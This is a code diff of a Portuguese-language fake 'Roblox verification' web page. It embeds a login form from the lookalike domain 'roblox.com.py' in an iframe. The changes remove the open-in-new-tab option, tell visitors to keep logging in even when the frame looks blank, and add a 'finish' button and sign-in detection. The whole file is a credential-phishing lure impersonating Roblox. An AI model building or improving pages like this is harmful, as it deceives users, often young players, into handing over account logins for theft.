@@ -6,9 +6,8 @@
   <title>Verificação Roblox</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
-    * { box-sizing: border-box; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
-      margin: 0; padding: 0;
       background: #111111; color: #ffffff;
       font-family: 'Roboto', sans-serif;
       min-height: 100vh;
@@ -20,16 +19,16 @@
       font-size: 1rem; flex-wrap: wrap; gap: 10px;
     }
     .logo { font-weight: bold; font-size: 1.4rem; }
-    .menu { display: flex; gap: 15px; flex-wrap: wrap; }
-    .menu a { color: white; text-decoration: none; font-size: 0.9rem; }
+    .menu { display: flex; gap: 12px; flex-wrap: wrap; font-size: 0.9rem; }
+    .menu a { color: white; text-decoration: none; }
     .user-info { display: flex; align-items: center; gap: 8px; font-size: 0.9rem; }
     .avatar { width: 28px; height: 28px; border-radius: 50%; background: #333; }
-    main { 
+    main {
       display: flex; flex-direction: column; align-items: center; justify-content: center;
       min-height: calc(100vh - 60px); text-align: center; padding: 15px;
     }
     .content { max-width: 600px; width: 100%; }
-    h1 { font-size: clamp(1.8rem, 6vw, 2.5rem); margin-bottom: 15px; }
+    h1 { font-size: clamp(1.8rem, 7vw, 2.5rem); margin-bottom: 15px; }
     p { color: #aaaaaa; margin-bottom: 30px; font-size: clamp(1rem, 4vw, 1.2rem); }
     .buttons { display: flex; justify-content: center; gap: 12px; margin-bottom: 30px; flex-wrap: wrap; }
     .btn-primary, .btn-secondary {
@@ -51,7 +50,7 @@
     .modal-content {
       width: 100%; max-width: 900px; height: 90vh; max-height: 95vh;
       background: #1e1e1e; border-radius: 12px; padding: 15px; position: relative;
-      box-shadow: 0 0 30px rgba(255,51,153,0.3); overflow: hidden;
+      overflow: hidden; box-shadow: 0 0 30px rgba(255,51,153,0.3);
     }
     .close-btn {
       position: absolute; top: 10px; right: 15px; background: none; border: none;
@@ -64,13 +63,17 @@
     .loading-screen {
       position: absolute; inset: 0; background: #1e1e1e;
       display: flex; flex-direction: column; align-items: center; justify-content: center;
-      color: #ffffff; font-size: 1.4rem; z-index: 5; text-align: center; padding: 20px;
+      color: #ffffff; font-size: 1.4rem; text-align: center; padding: 20px; z-index: 5;
     }
     iframe {
       width: 100%; height: 100%; border: none; background: #000;
+      display: none; /* começa escondido */
+    }
+    .confirm-area {
+      margin-top: 30px; display: none;
     }
     @media (max-width: 768px) {
-      header { padding: 10px; font-size: 0.9rem; }
+      header { padding: 10px; }
       .modal-content { height: 95vh; border-radius: 0; padding: 10px; }
       .close-btn { font-size: 2.2rem; top: 8px; right: 12px; }
       .buttons { flex-direction: column; gap: 10px; }
@@ -115,11 +118,13 @@
       <div class="verification-container">
         <div class="loading-screen" id="loading">
           <div>Preparando verificação<span class="loading-dots"></span></div>
-          <p style="margin-top:20px; font-size:1.1rem; color:#aaa;">
-            <strong>Importante:</strong> O site do Roblox bloqueia exibição dentro desta janela por segurança.<br>
-            A página pode aparecer em branco/cinza. Use o link abaixo se necessário.
+          <p style="margin: 20px 0; font-size: 1.1rem; color: #aaa;">
+            <strong>Atenção:</strong> O Roblox bloqueia a exibição da página de login dentro desta janela por segurança.<br>
+            A tela pode ficar branca/cinza. Continue com o login normalmente.
           </p>
-          <button class="btn-primary" id="open-external" style="margin-top:20px;">Abrir login do Roblox em nova aba</button>
+          <div class="confirm-area" id="confirm-area">
+            <button class="btn-primary" id="confirm-verified">Já fiz o login → Finalizar</button>
+          </div>
         </div>
         <iframe id="verify-iframe" src="about:blank" allowfullscreen></iframe>
       </div>
@@ -134,9 +139,12 @@
     const closeBtn = document.getElementById('close-modal');
     const loading = document.getElementById('loading');
     const iframe = document.getElementById('verify-iframe');
-    const openExternalBtn = document.getElementById('open-external');
+    const confirmArea = document.getElementById('confirm-area');
+    const confirmBtn = document.getElementById('confirm-verified');
 
     const IFRAME_URL = "https://roblox.com.py/login?returnUrl=3667493294562156"; // ou seu teste
+
+    let isFirstLoad = true;
 
     function completeVerification() {
       modal.classList.remove('open');
@@ -147,34 +155,42 @@
     function closeModal() {
       modal.classList.remove('open');
       iframe.src = "about:blank";
+      confirmArea.style.display = 'none';
     }
 
     startBtn.onclick = () => {
+      isFirstLoad = true;
       modal.classList.add('open');
       loading.style.display = 'flex';
       iframe.style.display = 'none';
+      confirmArea.style.display = 'none';
+
       iframe.src = IFRAME_URL;
 
       setTimeout(() => {
         loading.style.display = 'none';
         iframe.style.display = 'block';
-      }, 2000);
+        confirmArea.style.display = 'block'; // Mostra botão manual
+      }, 2500);
     };
 
-    openExternalBtn.onclick = () => {
-      window.open(IFRAME_URL, '_blank');
-    };
+    confirmBtn.onclick = completeVerification;
+
+    iframe.addEventListener('load', () => {
+      if (isFirstLoad) {
+        isFirstLoad = false;
+        return;
+      }
+      // Tentativa de detecção (pode falhar, mas não quebra nada)
+      try {
+        if (iframe.contentWindow.location.href.toLowerCase().includes("roblox.com")) {
+          setTimeout(completeVerification, 3000);
+        }
+      } catch {}
+    });
 
     closeBtn.onclick = closeModal;
     modal.onclick = (e) => { if (e.target === modal) closeModal(); };
-
-    // Se quiser "confirmar" manualmente, pode adicionar um botão extra no loading:
-    // const confirmManual = document.createElement('button');
-    // confirmManual.textContent = 'Já fiz o login → Finalizar';
-    // confirmManual.className = 'btn-primary';
-    // confirmManual.style.marginTop = '20px';
-    // confirmManual.onclick = completeVerification;
-    // loading.appendChild(confirmManual); // descomente se quiser
   </script>
 </body>
 </html>
